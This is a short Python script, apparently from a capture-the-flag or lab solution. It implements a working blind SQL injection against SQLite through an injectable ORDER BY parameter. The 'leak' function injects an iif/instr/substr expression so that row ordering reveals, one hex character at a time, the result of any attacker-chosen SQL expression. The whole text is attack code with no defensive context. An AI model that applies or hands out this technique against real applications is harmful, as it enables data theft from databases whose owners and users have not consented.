LEAK_LEN = 128
OFFS = 100

def get_table():
    cols = ("zero", "id", "val")
    data = []
    for i in range(16):
        data.append((0, 2 * i + 1, f"c{i:x}"))
    for i in range(LEAK_LEN):
        data.append((0, i + OFFS, f"p{i}"))

    return cols, data

def leak(expr, query_fn):
    # query_fn(col, od) = SELECT * FROM data ORDER BY <col> <od>
    query_result = query_fn("zero", f"+ iif(id < {OFFS}, id, instr('0123456789abcdef', substr(({expr}), id - {OFFS} + 1, 1)) * 2)")
    output = [None] * 128
    cur_ch = ""
    for row in query_result:
        val = row[2]
        if val[0] == "c":
            cur_ch = val[1:]
        elif val[0] == "p":
            output[int(val[1:])] = cur_ch

    return "".join(output)
